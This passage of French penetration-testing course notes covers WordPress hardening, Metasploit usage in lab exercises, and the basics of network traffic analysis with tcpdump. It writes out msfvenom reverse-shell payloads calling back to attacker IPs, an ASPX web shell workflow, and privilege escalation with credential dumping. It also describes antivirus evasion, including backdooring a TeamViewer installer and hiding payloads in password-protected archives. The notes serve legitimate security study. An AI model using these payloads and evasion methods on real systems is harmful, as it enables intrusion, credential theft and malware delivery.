Si tout se passe bien, tu obtiens :

```
[*] Meterpreter session 1 opened ...
meterpreter > getuid
Server username: www-data (33)

```

## Hardening WordPress (Durcissement)

*(Page 15 – bonnes pratiques)*

Cette partie est plutôt théorique, mais importante pour ton rapport / pour comprendre comment se défendre contre ce que tu viens d’exploiter.

### Mises à jour

- Toujours mettre à jour :
    - **WordPress core**
    - **Plugins**
    - **Thèmes**
- Possibilité d’activer les **mises à jour automatiques** dans `wp-config.php` :

```php
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );

```

### Gestion des plugins & thèmes

- Installer uniquement des plugins/thèmes **de confiance** (WordPress.org)
- Vérifier :
    - les **avis**
    - le **nombre d’installations**
    - la **date de dernière mise à jour**
- Supprimer les plugins/thèmes inutilisés (pas juste désactiver → vulnérables mais oubliés)

### Plugins de sécurité

Exemples :

- **Sucuri Security**
- **iThemes Security**
- **Wordfence Security**

Fonctionnalités utiles :

- WAF (Web Application Firewall)
- Scan malware
- Limitation des tentatives de login
- Journaux d’activités
- Renforcement des mots de passe

### Gestion des utilisateurs

- Éviter le user `admin` classique
- Imposer des **mots de passe forts**
- Activer et forcer la **2FA**
- Appliquer le **principe du moindre privilège**
- Auditer régulièrement les comptes et supprimer les comptes inutiles

### Configuration

- Empêcher l’énumération des utilisateurs
- Limiter les tentatives de connexion
- Restreindre / renommer `wp-login.php`
- Désactiver `xmlrpc.php` si non nécessaire
- Désactiver l’indexation de répertoire côté Apache

## **Using the Metasploit Framework**

![image.png](image%201.png)

## Préface & philosophie des outils

Le module commence par une réflexion sur l’usage des outils automatisés (comme Metasploit) :

- **Arguments “anti-outils” :**
    - Ça ne “prouve” pas les compétences du pentester.
    - Ça rend le travail “trop facile”.
    - Ça crée une **zone de confort** et un **tunnel vision** : “si l’outil ne le fait pas, je ne peux pas le faire”.
- **Arguments “pro-outils” :**
    - Ils font gagner du temps sur les tâches répétitives.
    - Ils sont pédagogiques (tu vois concrètement comment une vulnérabilité s’exploite).
    - Ils libèrent du temps pour les parties plus créatives/difficiles d’un audit.
- **Idées importantes :**
    - Tu dois **connaître tes outils** (options, comportements, traces laissées).
    - Ne pas faire reposer **tout** ton pentest sur Metasploit.
    - Le but est d’**impressionner toi-même**, pas la commu infosec.
    - Toujours viser une meilleure compréhension des mécanismes de sécurité derrière les exploits.

## Introduction à Metasploit

### Metasploit Project & Framework

- Metasploit est une **plateforme modulaire** en Ruby, pour :
    - Développer, tester et exécuter des exploits.
    - Gérer des payloads, du post-exploitation, de l’évasion, etc.
- Deux “branches” principales :
    - **Metasploit Framework**
        - Open source, gratuit, CLI.
    - **Metasploit Pro**
        - Version commerciale, GUI, orientée entreprise, avec :
            - Task chains, social engineering, reporting, intégration Nexpose, etc.

**Question du module :**

- *Quelle version de Metasploit possède une interface GUI ?* → **Metasploit Pro**
- *Quel est le binaire pour la version gratuite ?* → **`msfconsole`**

### Arborescence importante

Sous un ParrotOS/Kali typique : `/usr/share/metasploit-framework`

- `data`, `lib`, `documentation` : cœur du framework + docs.
- `modules/` :
    - `auxiliary`, `exploits`, `payloads`, `post`, etc.
- `plugins/` :
    - scripts Ruby pour intégrer Nessus, Nexpose, sqlmap, etc.
- `scripts/` :
    - `meterpreter/`, `resource/`, etc.
- `tools/` :
    - utilitaires en ligne de commande (recon, password, exploit, etc.).

## msfconsole & structure d’un engagement MSF

### Lancer msfconsole

```bash
msfconsole
msfconsole -q   # sans le gros banner ASCII

```

Metasploit s’occupe maintenant de ses mises à jour via `apt` :

```bash
sudo apt update && sudo apt install metasploit-framework

```

### Structure d’un engagement avec MSF

Le module découpe un engagement typique en 5 grandes phases :

**Enumeration**

- Découvrir les services, versions, OS.
- Exemple : `nmap -sV <IP>` ou `db_nmap` (dans msfconsole).

**Preparation**

- Recherche de vulnérabilités, mapping service/version ↔ CVE ↔ module MSF.
- Éventuel audit de code.

**Exploitation**

- Choisir et configurer un module `exploit/`.
- Lancer l’exploitation et obtenir un shell/session.

**Privilege Escalation**

- Élever les privilèges jusqu’à admin/System/root.

**Post-Exploitation**

- Pivot, exfiltration, persistance, récolte de credentials, etc.

Metasploit fournit des briques pour chacune de ces étapes (scanners, exploits, payloads, post modules, etc.).

## Modules : structure & recherche

### Format d’un module

Dans les résultats de recherche MSF :

```
<index> <type>/<os>/<service>/<name>

```

Exemple :

```
794 exploit/windows/ftp/scriptftp_list

```

- **index** → chiffre utilisé avec `use <index>`
- **type** → `exploit`, `auxiliary`, `post`, `payload`, `encoder`, `nop`, `evasion`, `plugin`
- **os** → `windows`, `linux`, `android`, etc.
- **service** → service ou catégorie (`smb`, `http`, `gather`, …)
- **name** → nom précis du module

**Modules interactifs** (ceux que tu peux `use`) :

- `auxiliary`, `exploit`, `post`

### Recherche de modules (`search`)

```
search [options] [keywords]

```

Tu peux filtrer par :

- `type:exploit`
- `platform:windows`
- `cve:2021`
- `rank:excellent`
- `name:...`, `description:...`
- etc.

Exemples vus dans le cours :

```
search eternalromance
search ms17_010
search type:exploit platform:windows cve:2021 rank:excellent microsoft

```

### Sélection & configuration d’un module

**Choisir un module via son index** :

```
use 0

```

**Voir les options** :

```
show options

```

**Paramétrer la cible & l’attaque** :

- `RHOSTS` : IP(s) de la cible
- `RPORT` : port cible (souvent par défaut correct)
- `LHOST` : ton IP (tun0 sur HTB par ex.)
- `LPORT` : port d’écoute (par défaut 4444, modifiable)

```
set RHOSTS 10.10.x.x
set LHOST 10.10.y.y

```

**Variables globales** (`setg`) :

- Conserve la valeur pour tous les modules tant que msfconsole est ouvert.

```
setg RHOSTS 10.10.x.x
setg LHOST 10.10.y.y

```

**Info détaillée du module** :

```
info

```

**Lancer l’exploit** :

```
run
# ou
exploit

```

## Targets (cibles MSF)

Chaque exploit peut supporter plusieurs “targets” (combos OS/version/service pack/langue, etc.).

- Dans un exploit :
    
    ```
    show targets
    
    ```
    
- Tu vois par exemple :
    
    ```
    0 Automatic
    1 IE 7 on Windows XP SP3
    2 IE 8 on Windows XP SP3
    ...
    6 IE 9 on Windows 7
    
    ```
    
- **Mode automatique** : `target 0` → le module tente de détecter la bonne cible.
- **Mode manuel** : si tu connais l’OS/version, tu peux fixer :
    
    ```
    set target 6
    
    ```
    

Dans la pratique, pour beaucoup de modules récents, le mode `Automatic` suffit.

## Payloads

### Types de payloads

Un payload est ce qui est exécuté **après** (ou pendant) l’exploitation pour te donner un accès ou exécuter quelque chose sur la cible.

Trois catégories :

**Singles**

- Payloads “monolithiques”.
- Tout est contenu dans un seul blob (exploit + action).
- Taille plus grande, mais simples.

**Stagers**

- Petits payloads dont le but principal est de mettre en place un **canal de communication** (reverse TCP, bind TCP, HTTP, etc.).
- Ils téléchargent ensuite un “stage” plus gros.

**Stages**

- Code “complet” téléchargé par le stager (ex : Meterpreter, VNC, etc.).
- Pas de limite de taille pratique.

Nom de payload :

- **single** : `windows/shell_reverse_tcp`
- **staged** : `windows/shell/reverse_tcp` (note le `/` qui sépare stager/stage)

### Meterpreter

Payload star de Metasploit :

- S’exécute en mémoire (pas d’écritures sur disque).
- Très modulable (extensions, scripts, plugins).
- Offre des commandes pour :
    - Fichiers (`ls`, `cd`, `download`, `upload`, `search`, …)
    - Réseau (`ifconfig`, `netstat`, `portfwd`, `route`, …)
    - Système (`ps`, `getuid`, `hashdump`, `sysinfo`, `shell`, `migrate`, …)
    - UI (`screenshot`, `screenshare`, keylogger, webcam, etc.).
    - Privilege escalation (`getsystem`, `steal_token`, …)

Tu passes ensuite en shell Windows si tu veux :

```
meterpreter > shell

```

### Choisir un payload

Dans un exploit :

```
show payloads

```

Pour filtrer :

```
grep meterpreter show payloads
grep meterpreter grep reverse_tcp show payloads

```

Puis :

```
set payload windows/x64/meterpreter/reverse_tcp
# ou via l’index
set payload 15

```

Le `show options` va alors afficher :

- les options de l’exploit (RHOSTS, RPORT, etc.)
- les options du payload (LHOST, LPORT, EXITFUNC, …)

## Encoders

### Rôle

Les encoders servent à :

- Adapter les payloads à certaines contraintes (architecture, bad chars, etc.).
- Historiquement, aider à contourner les signatures AV/IDS.
- Aujourd’hui, **beaucoup moins efficaces** pour l’évasion AV (les moteurs ont rattrapé leur retard).

Architectures supportées : `x86`, `x64`, `sparc`, `ppc`, `mips`, …

Exemple célèbre : **Shikata Ga Nai**

→ encoder polymorphique XOR, très utilisé pendant longtemps, désormais largement détecté.

### Encoders dans msfconsole

Dans un exploit + payload :

```
show encoders

```

Tu vois la liste des encoders compatibles (`x86/shikata_ga_nai`, `x64/xor`, etc.) avec un “rank”.

### Encodage avec msfvenom

Ancien combo : `msfpayload` + `msfencode` → remplacé par `msfvenom`.

Exemple :

```bash
# payload + encodage shikata_ga_nai
msfvenom -a x86 --platform windows \
  -p windows/meterpreter/reverse_tcp LHOST=... LPORT=... \
  -e x86/shikata_ga_nai \
  -f exe -o payload.exe

```

Tu peux faire plusieurs itérations :

```bash
msfvenom ... -e x86/shikata_ga_nai -i 10 ...

```

Le module montre bien que, même avec SGN + plusieurs itérations, **les AV modernes détectent toujours massivement** ce genre de payload.

## Base de données Metasploit (PostgreSQL)

### Initialisation

Sur la machine :

```bash
sudo systemctl start postgresql   # ou service postgresql start
sudo msfdb init
sudo msfdb run    # lance msfconsole connecté à la DB

```

Dans `msfconsole` :

```
db_status
[*] Connected to msf. Connection type: postgresql.

```

### Commandes DB utiles

```
help database

```

Principales :

- `db_import` : importe un fichier de résultats (Nmap, Nessus, etc.).
- `db_export` : exporte ton workspace (xml, pwdump).
- `db_nmap` : lance Nmap depuis msfconsole et stocke direct le résultat.
- `hosts` : liste les hôtes connus par la DB.
- `services` : liste les services découverts.
- `vulns` : vulnérabilités connues.
- `loot` : fichiers/artefacts récupérés.
- `creds` : credentials récoltés.
- `workspace` : gestion multi-projets.

### Workspaces

Comme des dossiers de projet :

```
workspace           # liste
workspace -a WebApp # ajoute un workspace
workspace WebApp    # switch
workspace -d Old    # supprime

```

### Importer & scanner

- Import Nmap XML :
    
    ```
    db_import scan.xml
    hosts
    services
    
    ```
    
- Lancer Nmap depuis MSF :
    
    ```
    db_nmap -sV -sS 10.10.x.x
    
    ```
    
- Export de sauvegarde :
    
    ```
    db_export -f xml backup.xml
    
    ```
    

## Plugins & Mixins

### Plugins

- Fichiers Ruby dans :
    
    ```bash
    /usr/share/metasploit-framework/plugins/
    
    ```
    
- Liste (exemples) :
    - `nessus.rb`, `nexpose.rb`, `openvas.rb`, `sqlmap.rb`, `wmap.rb`, etc.
- Chargement dans msfconsole :
    
    ```
    load nessus
    nessus_help
    
    ```
    

Plugins typiques :

- Intégration de scanners (Nessus, Nexpose, OpenVAS).
- Automation (DarkOperator’s pentest plugin).
- Intégration wiki, RSS, agrégation, etc.

**Installation d’un nouveau plugin :**

- Cloner le repo (ex : DarkOperator).
- Copier le `.rb` dans le dossier `plugins/`.
- Relancer `msfconsole` puis `load <plugin>`.

### Mixins (côté dev)

- Concept Ruby : inclusion de modules dans des classes (`include`).
- Permet de factoriser le code (HTTP client, SMB, etc.) dans des modules réutilisables.
- Important si tu écris tes propres modules, moins si tu ne fais “que” les utiliser.

## Labs / Flags du module

### Lab 1 – EternalRomance (MS17-010, SMB)

**Objectif :** Utiliser Metasploit pour exploiter une vulnérabilité SMB sur une machine Windows, obtenir un shell SYSTEM, trouver `flag.txt` sur le bureau d’Administrator.

**Approche générale (haut niveau) :**

**Enumeration**

- Scanner la cible (Nmap) pour identifier un SMB vulnérable (port 445 + Windows 7/10).

**Recherche du module**

- Dans `msfconsole` : `search ms17_010` ou `search eternalromance`.
- Choisir un module approprié (par ex. un module SMB/Psexec lié à MS17-010).

**Configuration**

- `use` sur le module choisi.
- `show options` pour voir `RHOSTS`, `RPORT`, etc.
- `set RHOSTS <IP_cible>`
- Configurer `LHOST` avec ton IP VPN HTB.
- Laisser le payload par défaut ou mettre un `meterpreter/reverse_tcp`.

**Exploitation**

- `run` / `exploit`.
- Tu obtiens un shell / une session (cmd ou Meterpreter) avec les privilèges SYSTEM.
1. **Récupération du flag**
    - Naviguer jusqu’à `C:\Users\Administrator\Desktop\flag.txt`.
    - Lire le fichier.

### Lab 2 – Exploitation d’Apache Druid

**Objectif :** Exploiter un service Apache Druid vulnérable via Metasploit, puis récupérer un `flag.txt`.

**Approche (conceptuelle) :**

**Enumeration**

- Scanner la machine, repérer un service Apache Druid (port HTTP + bannières, etc.).

**Recherche du module MSF**

- `search druid` ou via `search cve:...` si la vulnérabilité est connue.
- Choisir un module `exploit/` approprié pour Apache Druid.

**Configuration**

- `use` sur le module.
- `show options` pour voir les paramètres (RHOSTS, RPORT, éventuellement PATH, etc.).
- `set RHOSTS <IP_cible>`
- Configurer un payload adapté (souvent un `meterpreter` ou `shell` selon le module).

**Exploitation**

- `run` / `exploit` pour obtenir un shell sur la machine cible.

**Récupération du flag**

- Rechercher `flag.txt` sur la machine (`find` / `search` ou navigation manuelle).
- Lire le contenu du fichier.

## Petit mémo Metasploit (cheat sheet rapide)

```
# Lancer le framework
msfconsole -q

# Rechercher un module
search <mot_clé>
search type:exploit platform:windows cve:2017 rank:excellent

# Sélectionner un module
use <index>           # depuis search
use exploit/...       # chemin complet

# Voir options, targets, payloads
show options
show targets
show payloads
info                  # doc détaillée du module

# Paramétrage classique
set RHOSTS <IP>
set RPORT <PORT>
set LHOST <IP_local>
set LPORT 4444
setg LHOST <IP>       # global
setg RHOSTS <IP>      # global

# Choisir un payload
set payload <nom_complet_payload>

# Lancer l’exploit
run
exploit

# Sessions
sessions              # liste
sessions -i <id>      # interagir
background            # mettre une session en arrière-plan

# DB
db_status
db_nmap <options> <IP>
hosts
services
workspace -a <name>
workspace <name>
db_export -f xml backup.xml

```

### Sessions

- **Qu’est-ce qu’une session ?**
    
    Un canal de communication persistant avec une cible (par ex. un shell Meterpreter ou un autre payload).
    
- **Mettre une session en arrière-plan**
    - `CTRL + Z` **ou** `background` (depuis Meterpreter).
    - La session continue de tourner ; tu es simplement renvoyé vers `msf6 >`.
- **Lister les sessions**
    
    ```bash
    msf6 > sessions
    
    ```
    
- **Interagir avec une session spécifique**
    
    ```bash
    msf6 > sessions -i 1
    meterpreter >
    
    ```
    
- **Workflow classique**
    1. Exploiter la cible → obtenir un Meterpreter.
    2. Mettre la session en arrière-plan avec `background`.
    3. `use` un module **post**.
    4. Définir l’option `SESSION` avec l’ID de la session.
    5. `run`.
    
    Exemple :
    
    ```bash
    meterpreter > bg
    msf6 > use post/multi/recon/local_exploit_suggester
    msf6 post(...) > set SESSION 1
    msf6 post(...) > run
    
    ```
    

### Jobs

- Les jobs = modules qui tournent en arrière-plan (comme des handlers / listeners).
- **Voir l’aide des jobs**
    
    ```bash
    msf6 > jobs -h
    
    ```
    
- **Lancer un exploit en tant que job**
    
    ```bash
    msf6 exploit(multi/handler) > exploit -j
    
    ```
    
- **Lister les jobs**
    
    ```bash
    msf6 > jobs -l
    
    ```
    
- **Tuer un job spécifique**
    
    ```bash
    msf6 > jobs -k 0
    
    ```
    
- **Tuer tous les jobs**
    
    ```bash
    msf6 > jobs -K
    
    ```
    
- Quand utiliser les jobs :
    - Tu as besoin d’un listener qui tourne en continu (multi/handler).
    - Un port est « occupé » parce qu’un handler tourne encore en arrière-plan.

## Notions essentielles sur Meterpreter

### Ce qu’est Meterpreter

- Payload avancé en mémoire (la « boîte à outils suisse » du pentest).
- Réside en RAM, aucun fichier sur le disque → furtif et difficile à analyser en forensic.
- Communications chiffrées (AES) dans MSF6.
- Extensible avec des modules & extensions (`stdapi`, `priv`, etc.).

### Commandes de base essentielles

Depuis `meterpreter > help` (les plus utiles) :

- `background` / `bg` – met la session en arrière-plan.
- `sessions` – bascule entre les différentes sessions.
- `getuid` – affiche l’utilisateur courant.
- `ps` – liste les processus.
- `migrate` – migre vers un autre processus.
- `steal_token PID` – usurpe un jeton (token) d’un autre processus.
- `hashdump` – dump les hashes locaux du SAM.
- `lsa_dump_sam` / `lsa_dump_secrets` – récupère des identifiants plus profonds (nécessite SYSTEM).
- `run` – lance des scripts Meterpreter / modules post.

### Exemple de chaîne d’attaque (IIS WebDAV / type Granny)

**Scanner & identifier le service**

```bash
msf6 > db_nmap -sV -p- -T5 -A 10.10.10.15

```

Résultat : `Microsoft IIS httpd 6.0` sur le port 80, WebDAV activé.

**Recherche de l’exploit**

```bash
msf6 > search iis_webdav_upload_asp
msf6 > use exploit/windows/iis/iis_webdav_upload_asp
msf6 exploit(...) > set RHOSTS 10.10.10.15
msf6 exploit(...) > set LHOST tun0
msf6 exploit(...) > run

```

**Obtenir Meterpreter, puis tester `getuid`**

- Si `getuid` échoue : `Operation failed: Access is denied`.
- Utiliser `ps` puis `steal_token` sur un processus qui tourne sous `NETWORK SERVICE`, etc.
- Ensuite `getuid` → `NT AUTHORITY\NETWORK SERVICE`.

**Élévation de privilèges avec Local Exploit Suggester**

```bash
meterpreter > bg
msf6 > use post/multi/recon/local_exploit_suggester
msf6 post(...) > set SESSION 1
msf6 post(...) > run

```

Il suggère par exemple :

- `exploit/windows/local/ms15_051_client_copy_image` etc.

**Lancer l’exploit local choisi**

```bash
msf6 > use exploit/windows/local/ms15_051_client_copy_image
msf6 exploit(...) > set SESSION 1
msf6 exploit(...) > set LHOST tun0
msf6 exploit(...) > run
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```

**Exemples de post-exploitation**

- `hashdump`
- `lsa_dump_sam`
- `lsa_dump_secrets`

## Écriture & import de modules Metasploit

### Installation de modules tiers (Exploit-DB / searchsploit)

**Trouver des exploits au format Metasploit**

```bash
searchsploit nagios3
searchsploit -t Nagios3 --exclude=".py"

```

Chercher les entrées `.rb` qui mentionnent Metasploit.

**Répertoires de modules Metasploit**

Chemin principal du framework :

```bash
/usr/share/metasploit-framework/

```

Données locales MSF :

```bash
~/.msf4/

```

**Placer le module dans le bon répertoire**

Exemple :

```bash
cp ~/Downloads/9861.rb \
  /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb

```

Utiliser des noms en *snake_case* :

- ✅ `nagios3_command_injection.rb`
- ❌ `nagios3-command-injection.rb`

**Charger les nouveaux modules**

Option A (lancer msfconsole avec un chemin supplémentaire) :

```bash
msfconsole -m /usr/share/metasploit-framework/modules/

```

Option B (depuis msfconsole) :

```bash
msf6 > loadpath /usr/share/metasploit-framework/modules/
# ou
msf6 > reload_all

```

**Utiliser le module**

```bash
msf6 > search nagios3_command_injection
msf6 > use exploit/unix/webapp/nagios3_command_injection
msf6 exploit(...) > show options

```

### Portage d’exploits vers Metasploit

- Les modules sont des classes Ruby :
    
    ```ruby
    class MetasploitModule < Msf::Exploit::Remote
      Rank = ExcellentRanking
    
      include Msf::Exploit::Remote::HttpClient
      include Msf::Exploit::PhpEXE
      include Msf::Auxiliary::Report
    
    ```
    
- **Section d’info :**
    - `Name`, `Description`, `Author`, `References`, `Platform`, `Arch`, `Targets`, `DisclosureDate`, etc.
- **Options :**
    
    ```ruby
    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path for Bludit', '/']),
        OptString.new('BLUDITUSER', [true, 'The username for Bludit']),
        OptPath.new('PASSWORDS', [true, 'The list of passwords',
                File.join(Msf::Config.data_directory, "wordlists", "passwords.txt") ])
      ])
    
    ```
    
- Réutiliser un module existant similaire comme base, puis :
    - Mettre à jour les métadonnées.
    - Remplacer la logique HTTP, les paramètres, etc.
    - Adapter pour utiliser les bons mixins MSF (HttpClient, PhpEXE, etc.).

## Bases de MSFVenom

MSFVenom = générateur de payload + encodeur.

### Exemple : générer un payload Meterpreter ASPX

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=1337 \
  -f aspx > reverse_shell.aspx

```

Ensuite :

1. Uploader `reverse_shell.aspx` dans le répertoire web (via FTP, etc.).
2. Configurer le handler :
    
    ```bash
    msf6 > use exploit/multi/handler
    msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
    msf6 exploit(multi/handler) > set LHOST 10.10.14.5
    msf6 exploit(multi/handler) > set LPORT 1337
    msf6 exploit(multi/handler) > run
    
    ```
    
3. Visiter `http://target/reverse_shell.aspx` → session Meterpreter.

### Local Exploit Suggester avec des shells MSFVenom

Quand ton Meterpreter a peu de privilèges (ex : `IIS APPPOOL\Web`) :

1. `sysinfo` → identifier l’architecture (x86).
2. `search local exploit suggester`
3. `use post/multi/recon/local_exploit_suggester`
4. `set SESSION <id>` → `run`
5. Choisir un exploit local suggéré (ex : `ms10_015_kitrap0d`) et le lancer pour obtenir `NT AUTHORITY\SYSTEM`.

## Évitement Firewall / IDS / AV (haut niveau)

### Endpoint vs Périmètre

- **Protection endpoint** = AV, antimalware, firewall hôte, etc.
- **Protection périmètre** = firewalls, IDS/IPS, WAFs, etc., généralement à la périphérie du réseau / dans la DMZ.

### Méthodes de détection

- Basée sur les signatures.
- Heuristique / détection d’anomalies.
- Analyse de protocole avec état (stateful).
- Supervision humaine / SOC.

### Techniques d’évasion spécifiques à MSF

**Communications chiffrées**

- Meterpreter dans MSF6 utilise AES pour le C2.
- Plus difficile pour un IDS réseau de détecter les patterns de payload.

**Templates d’exécutables avec msfvenom**

Exemple : backdoor d’un EXE légitime :

```bash
msfvenom windows/x86/meterpreter_reverse_tcp \
  LHOST=10.10.14.2 LPORT=8080 \
  -k \
  -x ~/Downloads/TeamViewer_Setup.exe \
  -e x86/shikata_ga_nai \
  -a x86 --platform windows \
  -i 5 \
  -o ~/Desktop/TeamViewer_Setup.exe

```

- `x` → utiliser un EXE existant comme template.
- `k` → conserver le fonctionnement normal du programme (lancer l’app + le payload).
- `e` et `i` → encodeur & itérations (ex : Shikata Ga Nai).

**Archives**

- Mettre un mot de passe sur les archives contenant les payloads → l’AV ne peut pas analyser le contenu directement.
- Astuce de double archive :
    - Créer une archive du payload (avec mot de passe).
    - Retirer l’extension (ex : `.rar` → aucun suffixe).
    - Archiver à nouveau ce fichier avec un mot de passe.
- L’AV enregistre souvent juste « impossible à scanner » au lieu de marquer comme malware.

**Packers**

- Compresser / packer les exécutables (UPX, Enigma Protector, MPRESS, etc.).
- Rend les signatures statiques plus difficiles à utiliser.

**Code d’exploit**

- Randomiser les patterns de buffer.
- Éviter les gros NOP sleds évidents.
- Tester les exploits & payloads dans un labo avant de les utiliser sur des cibles réelles.

## Mises à jour de Metasploit Framework (août 2020 → MSF6)

Points clés :

- Les sessions de payload créées avec MSF5 ne sont pas compatibles avec MSF6 (mécanismes de comm différents).
- **Fonctionnalités de génération :**
    - Chiffrement de bout en bout pour Meterpreter (Windows, Python, Java, Mettle, PHP).
    - Support client SMBv3.
    - Nouvelle génération polymorphique de shellcode Windows.
- **Artefacts plus propres :**
    - Les DLL Meterpreter résolvent les fonctions par ordinal (et non plus par nom).
    - Plus de chaîne en clair `ReflectiveLoader` dans les binaires.
    - Les IDs de commandes Meterpreter sont encodés en entiers.
- **Mimikatz → Kiwi**
    - L’extension Mimikatz a été remplacée par `kiwi`. Charger Mimikatz revient désormais à charger Kiwi.

## **Intro to Network Traffic Analysis**

# Intro to Network Traffic Analysis

## Mini Write-Up en Français

L’**analyse de trafic réseau** (Network Traffic Analysis – NTA) consiste à **capturer et examiner** les communications qui circulent sur un réseau afin de :

- Comprendre comment les systèmes échangent des données
- Détecter des anomalies
- Identifier des menaces de sécurité

En connaissant le trafic “normal” de l’environnement, on peut repérer plus facilement :

- des comportements suspects (port scan, C2, exfiltration, etc.)
- des erreurs réseau ou mauvaises configurations
- des signes d’intrusion ou de malware

## Pourquoi l’analyse de trafic est importante

Un attaquant doit forcément **communiquer** avec le réseau pour :

- se déplacer latéralement,
- exécuter des commandes (C2),
- exfiltrer des données.

Ces actions laissent des traces dans le trafic :

- ports / protocoles inhabituels
- communications anormales entre hôtes
- volumes ou fréquences de connexions étranges

L’analyse de trafic permet :

- la **détection de menaces** (ransomware, exploits, scans, C2, etc.)
- le **dépannage réseau** (latence, erreurs de protocole, pertes de paquets)
- la **forensique** et le **threat hunting**
- le respect des **exigences de sécurité** et de conformité

## Bases nécessaires pour faire de la NTA

### Modèles OSI & TCP/IP

- **Modèle OSI** : 7 couches, de **Physique (1)** à **Application (7)**
- **Modèle TCP/IP** : 4 couches – **Link, Internet, Transport, Application**

Les données sont encapsulées couche par couche dans des **PDU** (Protocol Data Units) :

> trame Ethernet → paquet IP → segment TCP/UDP → données applicatives.
> 

Dans Wireshark, on voit ces couches dans l’ordre **inverse** de la désencapsulation :

Ethernet en haut, application en bas.

### Mécanismes d’adressage

- **Adresse MAC** (couche 2 / liaison)
    - 48 bits en hexadécimal
    - Utilisée dans un domaine de broadcast (LAN)
- **IPv4** (couche 3 / Internet)
    - 32 bits, ex : `192.168.86.243`
- **IPv6**
    - 128 bits, en hexadécimal
    - Types : *unicast, anycast, multicast* (pas de broadcast)

### Protocoles de transport : TCP vs UDP

### TCP

- Orienté connexion, fiable
- **Three-way handshake** : `SYN → SYN/ACK → ACK`
- Utilise des numéros de **séquence** et **d’acquittement** (ACK)
- Fin de session propre : `FIN, ACK / FIN, ACK / ACK`
- Utilisé notamment par : **HTTP(S), SSH, FTP, SMB, RDP**, etc.

### UDP

- Sans connexion (fire and forget)
- Pas de handshake, pas de garantie de livraison
- Plus rapide, utile pour :
    - **DNS**, streaming, VoIP, jeux en ligne, etc.

## Protocoles applicatifs importants

### HTTP / HTTPS

**HTTP** :

- Protocole en clair, sans état (stateless)
- Généralement sur le port TCP **80** (ou 8000, 8080, etc.)
- Méthodes courantes :
    - `GET`, `HEAD`, `POST`, `PUT`, `DELETE`, `OPTIONS`, `TRACE`, `CONNECT`

**HTTPS** :

- HTTP encapsulé dans **TLS**
- En général sur TCP **443**
- Négociation TLS via :
    - `ClientHello / ServerHello`, choix des suites cryptographiques
    - Certificats X.509, génération de clés, établissement de la session chiffrée
- Dans les captures, après le handshake, on voit surtout :
    
    → **TLS Application Data** (contenu HTTP chiffré)
    

### FTP

- Protocole de **transfert de fichiers**, non chiffré
- Utilise deux ports TCP :
    - **21** : canal de commande
    - **20** : canal de données
- Modes :
    - **Actif**
    - **Passif** (plus pratique derrière NAT / pare-feux)

Commandes FTP classiques :

- `USER`, `PASS`, `LIST`, `RETR`, `CWD`, `STOR`, `PASV`, `PORT`, `QUIT`, etc.

En analyse réseau, FTP est intéressant pour :

- repérer des transferts de fichiers suspects
- récupérer au vol des fichiers à partir d’un PCAP
- voir des identifiants transmis en clair

### SMB

- Protocole de partage de fichiers et d’imprimantes, très répandu en environnement Windows
- Utilise principalement le port **TCP 445**
- Permet aux attaquants :
    - mouvement latéral entre machines
    - accès à des partages réseau sensibles
    - abus de comptes/domain credentials

Signaux d’alerte :

- nombreuses tentatives d’authentification ratées
- trafic SMB inhabituel entre postes utilisateurs (host-to-host)
- accès à des partages ou chemins non habituels

## Processus général d’analyse de trafic

Le module insiste sur un **workflow d’analyse** en quatre grandes phases :

### Analyse descriptive – *Qu’est-ce qui se passe ?*

- Définir l’**incident** :
    - lenteurs réseau, comportement étrange d’un poste, suspicion de malware, etc.
- Définir **le scope et les objectifs** :
    - hôtes / réseaux concernés
    - protocoles importants (HTTP, FTP, SMB, DNS, RDP, etc.)
    - période (ex. dernières 24h / 48h)

Exemple :

> “Sur le réseau 192.168.100.0/24, vérifier s’il y a des téléchargements de superbad.exe et new-crypto-miner.exe via HTTP ou FTP sur les dernières 48h.”
> 

### Analyse diagnostique – *Pourquoi ça se produit ?*

- Capturer le trafic au bon endroit :
    - SPAN / port mirroring, TAP, sur le même VLAN, ou sur la sortie Internet
- **Filtrer** pour supprimer la baseline (trafic normal, bruit)
- Isoler ce qui est intéressant :
    - hôtes suspects
    - ports non standards
    - fichiers transférés
    - erreurs et comportements anormaux

### Analyse prédictive – *Qu’est-ce que ça implique ?*

- Comparer aux comportements habituels (baselines)
- Repérer des patterns :
    - beaconing (C2), commandes répétitives, timings réguliers, etc.
- Prendre des **notes précises** :
    - timestamps
    - IP / ports
    - numéros de paquets
    - noms de fichiers et URLs
    - identifiants utilisés

### Analyse prescriptive – *Que doit-on faire ?*

- Proposer des actions :
    - isoler un poste
    - bloquer une IP/domaine
    - filtrer un port
    - déclencher une vraie procédure d’Incident Response
- Faire un **résumé clair** :
    - ce qui s’est passé
    - les preuves (PCAP, logs, captures Wireshark)
    - les impacts possibles

## Tcpdump : fondamentaux et filtres

### Commandes de base

Vérifier si `tcpdump` est installé :

```bash
which tcpdump

```

Lister les interfaces disponibles :

```bash
sudo tcpdump -D

```

Capturer sur l’interface `eth0` :

```bash
sudo tcpdump -i eth0

```

Capture un peu plus “lisible” (sans résolution DNS/port, verbeuse, ASCII+hex, 100 paquets) :

```bash
sudo tcpdump -i eth0 -nnvXc 100

```

Options utiles :

- `e` : inclure l’en-tête Ethernet
- `X` : afficher contenu en Hex + ASCII
- `XX` : idem mais avec en-tête Ethernet
- `v`, `vv`, `vvv` : verbosité croissante

### Fichiers PCAP

Écrire le trafic dans un fichier :

```bash
sudo tcpdump -i eth0 -w /tmp/capture.pcap

```

Lire un fichier PCAP :

```bash
sudo tcpdump -r /tmp/capture.pcap

```

(éventuellement avec `-nnvX` pour plus de détails)

### Filtres BPF (Berkeley Packet Filter)

Filtres fréquents :

- Trafic impliquant un hôte précis :
    
    ```bash
    host 10.10.20.1
    
    ```
    
- Source ou destination spécifique :
    
    ```bash
    src host 172.16.146.2
    dst host 172.16.146.2
    
    ```
    
- Réseau entier :
    
    ```bash
    net 192.168.1.0/24
    
    ```
    
- Port spécifique :
    
    ```bash
    port 80
    
    ```
    
- Plage de ports :
    
    ```bash
    portrange 0-1024
    
    ```
    
- Protocole :
    
    ```bash
    tcp
    udp
    icmp
    proto 17   # UDP
    
